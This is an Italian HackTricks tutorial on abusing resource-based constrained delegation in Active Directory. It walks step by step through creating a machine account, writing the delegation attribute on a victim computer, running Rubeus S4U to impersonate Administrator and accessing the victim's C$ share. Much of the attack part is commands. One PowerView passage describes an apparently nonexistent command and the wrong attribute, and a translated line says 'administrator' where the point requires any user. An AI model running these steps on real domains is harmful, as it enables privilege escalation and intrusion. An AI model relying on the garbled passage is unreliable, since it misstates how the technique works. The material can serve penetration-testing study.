# Delega limitata basata sulle risorse

<details>

<summary><strong>Impara l'hacking di AWS da zero a esperto con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Altri modi per supportare HackTricks:

* Se vuoi vedere la tua **azienda pubblicizzata in HackTricks** o **scaricare HackTricks in PDF** Controlla i [**PACCHETTI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
* Ottieni il [**merchandising ufficiale di PEASS & HackTricks**](https://peass.creator-spring.com)
* Scopri [**The PEASS Family**](https://opensea.io/collection/the-peass-family), la nostra collezione di esclusive [**NFT**](https://opensea.io/collection/the-peass-family)
* **Unisciti al** 💬 [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo Telegram**](https://t.me/peass) o **seguici** su **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Condividi i tuoi trucchi di hacking inviando PR a** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

## Concetti di base della delega limitata basata sulle risorse

Questo è simile alla [delega limitata](constrained-delegation.md) di base ma **invece** di concedere autorizzazioni a un **oggetto** per **impersonare qualsiasi utente nei confronti di un servizio**. La delega limitata basata sulle risorse **imposta** nell'**oggetto chi può impersonare qualsiasi utente nei suoi confronti**.

In questo caso, l'oggetto limitato avrà un attributo chiamato _**msDS-AllowedToActOnBehalfOfOtherIdentity**_ con il nome dell'utente che può impersonare qualsiasi altro utente nei suoi confronti.

Un'altra differenza importante tra questa delega limitata e le altre deleghe è che qualsiasi utente con **autorizzazioni di scrittura su un account di macchina** (_GenericAll/GenericWrite/WriteDacl/WriteProperty/etc_) può impostare il _**msDS-AllowedToActOnBehalfOfOtherIdentity**_ (nelle altre forme di delega era necessario avere privilegi di amministratore di dominio).

### Nuovi concetti

Nella delega limitata è stato detto che il flag **`TrustedToAuthForDelegation`** all'interno del valore _userAccountControl_ dell'utente è necessario per eseguire un **S4U2Self**. Ma questo non è del tutto vero.\
La realtà è che anche senza quel valore, puoi eseguire un **S4U2Self** su qualsiasi utente se sei un **servizio** (hai un SPN) ma, se **hai `TrustedToAuthForDelegation`**, il TGS restituito sarà **Forwardable** e se **non hai** quel flag il TGS restituito **non sarà** **Forwardable**.

Tuttavia, se il **TGS** utilizzato in **S4U2Proxy** non è **Forwardable**, cercare di sfruttare una **delega limitata di base** **non funzionerà**. Ma se stai cercando di sfruttare una **delega limitata basata sulle risorse, funzionerà** (questo non è una vulnerabilità, è una funzionalità, apparentemente).

### Struttura dell'attacco

> Se hai **privilegi di scrittura equivalenti** su un **account di computer** puoi ottenere **accesso privilegiato** a quella macchina.

Supponiamo che l'attaccante abbia già **privilegi di scrittura equivalenti sul computer della vittima**.

1. L'attaccante **compromette** un account che ha un **SPN** o **ne crea uno** ("Servizio A"). Nota che **qualsiasi** _Utente amministratore_ senza altri privilegi speciali può **creare** fino a 10 **oggetti di computer (**_**MachineAccountQuota**_**)** e impostare loro un **SPN**. Quindi l'attaccante può semplicemente creare un oggetto di computer e impostare un SPN.
2. L'attaccante **sfrutta il suo privilegio di SCRITTURA** sul computer della vittima (Servizio B) per configurare **la delega limitata basata sulle risorse per consentire a Servizio A di impersonare qualsiasi utente** nei confronti di quel computer della vittima (Servizio B).
3. L'attaccante usa Rubeus per eseguire un **attacco S4U completo** (S4U2Self e S4U2Proxy) da Servizio A a Servizio B per un utente **con accesso privilegiato a Servizio B**.
1. S4U2Self (dall'account compromesso/creato con SPN): Richiedi un **TGS dell'Amministratore per me** (Non Forwardable).
2. S4U2Proxy: Usa il **TGS non Forwardable** del passaggio precedente per richiedere un **TGS** da **Amministratore** all'**host vittima**.
3. Anche se stai usando un TGS non Forwardable, poiché stai sfruttando la delega limitata basata sulle risorse, funzionerà.
4. L'attaccante può **pass-the-ticket** e **impersonare** l'utente per ottenere **accesso al Servizio B della vittima**.

Per verificare il _**MachineAccountQuota**_ del dominio puoi usare:
```powershell
Get-DomainObject -Identity "dc=domain,dc=local" -Domain domain.local | select MachineAccountQuota
```
## Attacco

### Creazione di un oggetto Computer

È possibile creare un oggetto computer all'interno del dominio utilizzando [powermad](https://github.com/Kevin-Robertson/Powermad)**:**
```powershell
import-module powermad
New-MachineAccount -MachineAccount SERVICEA -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose

# Check if created
Get-DomainComputer SERVICEA
```
### Configurazione della Delega Vincolata basata su Risorse

**Utilizzando il modulo PowerShell di Active Directory**
```powershell
Set-ADComputer $targetComputer -PrincipalsAllowedToDelegateToAccount SERVICEA$ #Assing delegation privileges
Get-ADComputer $targetComputer -Properties PrincipalsAllowedToDelegateToAccount #Check that it worked
```
**Utilizzando powerview**

Powerview è un modulo di PowerShell che fornisce una vasta gamma di funzionalità per l'analisi e l'esplorazione di un dominio Active Directory. È particolarmente utile per l'individuazione e l'analisi delle deleghe basate su risorse.

Per ottenere informazioni sulle deleghe basate su risorse, è possibile utilizzare il comando `Get-DomainObject` di Powerview. Questo comando restituisce una lista di oggetti nel dominio, inclusi gli oggetti che hanno abilitata la delega basata su risorse.

```powershell
Get-DomainObject -DelegationRights
```

Questo comando restituirà una lista di oggetti con le relative proprietà, tra cui l'attributo `msDS-AllowedToDelegateTo`, che indica gli account a cui è consentita la delega.

Per individuare gli account che hanno abilitata la delega basata su risorse, è possibile filtrare i risultati utilizzando il comando `Where-Object` di Powerview. Ad esempio, per trovare gli account che hanno abilitata la delega basata su risorse per un determinato servizio, è possibile utilizzare il seguente comando:

```powershell
Get-DomainObject -DelegationRights | Where-Object {$_.msDS-AllowedToDelegateTo -like "*<servizio>*"}
```

Sostituisci `<servizio>` con il nome del servizio di interesse.

Utilizzando Powerview, è possibile esplorare e analizzare le deleghe basate su risorse nel dominio Active Directory in modo efficiente e automatizzato.
```powershell
$ComputerSid = Get-DomainComputer FAKECOMPUTER -Properties objectsid | Select -Expand objectsid
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$ComputerSid)"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)
Get-DomainComputer $targetComputer | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}

#Check that it worked
Get-DomainComputer $targetComputer -Properties 'msds-allowedtoactonbehalfofotheridentity'

msds-allowedtoactonbehalfofotheridentity
----------------------------------------
{1, 0, 4, 128...}
```
### Eseguire un attacco S4U completo

Prima di tutto, abbiamo creato il nuovo oggetto Computer con la password `123456`, quindi abbiamo bisogno dell'hash di quella password:
```bash
.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local
```
Questo stamperà gli hash RC4 e AES per quell'account.\
Ora l'attacco può essere eseguito:
```bash
rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<aes256 hash> /aes128:<aes128 hash> /rc4:<rc4 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /domain:domain.local /ptt
```
Puoi generare più ticket semplicemente chiedendo una volta utilizzando il parametro `/altservice` di Rubeus:
```bash
rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<AES 256 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /altservice:krbtgt,cifs,host,http,winrm,RPCSS,wsman,ldap /domain:domain.local /ptt
```
{% hint style="danger" %}
Nota che gli utenti hanno un attributo chiamato "**Non può essere delegato**". Se un utente ha questo attributo impostato su True, non sarai in grado di impersonarlo. Questa proprietà può essere visualizzata all'interno di Bloodhound.
{% endhint %}

### Accesso

L'ultimo comando eseguirà l'**attacco completo S4U e inietterà il TGS** dall'Amministratore all'host vittima in **memoria**.\
In questo esempio è stato richiesto un TGS per il servizio **CIFS** dall'Amministratore, quindi sarai in grado di accedere a **C$**:
```bash
ls \\victim.domain.local\C$
```
### Abuso di diversi ticket di servizio

Scopri i [**ticket di servizio disponibili qui**](silver-ticket.md#servizi-disponibili).

## Errori di Kerberos

* **`KDC_ERR_ETYPE_NOTSUPP`**: Questo significa che Kerberos è configurato per non utilizzare DES o RC4 e stai fornendo solo l'hash RC4. Fornisci a Rubeus almeno l'hash AES256 (o fornisci solo gli hash rc4, aes128 e aes256). Esempio: `[Rubeus.Program]::MainString("s4u /user:FAKECOMPUTER /aes256:CC648CF0F809EE1AA25C52E963AC0487E87AC32B1F71ACC5304C73BF566268DA /aes128:5FC3D06ED6E8EA2C9BB9CC301EA37AD4 /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:Administrator /msdsspn:CIFS/M3DC.M3C.LOCAL /ptt".split())`
* **`KRB_AP_ERR_SKEW`**: Questo significa che l'ora del computer corrente è diversa da quella del DC e Kerberos non sta funzionando correttamente.
* **`preauth_failed`**: Questo significa che il nome utente fornito + gli hash non funzionano per l'accesso. Potresti aver dimenticato di inserire il simbolo "$" all'interno del nome utente durante la generazione degli hash (`.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local`)
* **`KDC_ERR_BADOPTION`**: Questo potrebbe significare:
* L'utente che stai cercando di impersonare non può accedere al servizio desiderato (perché non puoi impersonarlo o perché non ha sufficienti privilegi)
* Il servizio richiesto non esiste (se richiedi un ticket per winrm ma winrm non è in esecuzione)
* Il fakecomputer creato ha perso i suoi privilegi sul server vulnerabile e devi restituirli.

## Riferimenti

* [https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html](https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html)
* [https://www.harmj0y.net/blog/redteaming/another-word-on-delegation/](https://www.harmj0y.net/blog/redteaming/another-word-on-delegation/)
* [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution#modifying-target-computers-ad-object](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution#modifying-target-computers-ad-object)
* [https://stealthbits.com/blog/resource-based-constrained-delegation-abuse/](https://stealthbits.com/blog/resource-based-constrained-delegation-abuse/)

<details>

<summary><strong>Impara l'hacking di AWS da zero a eroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Altri modi per supportare HackTricks:

* Se vuoi vedere la tua **azienda pubblicizzata in HackTricks** o **scaricare HackTricks in PDF** Controlla i [**PACCHETTI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
* Ottieni il [**merchandising ufficiale di PEASS & HackTricks**](https://peass.creator-spring.com)
* Scopri [**The PEASS Family**](https://opensea.io/collection/the-peass-family), la nostra collezione di esclusive [**NFT**](https://opensea.io/collection/the-peass-family)
* **Unisciti al** 💬 [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo Telegram**](https://t.me/peass) o **seguici** su **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Condividi i tuoi trucchi di hacking inviando PR a** [**HackTricks**](https://github.com/carlospolop/hacktricks) **e** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **github repos.**

</details>
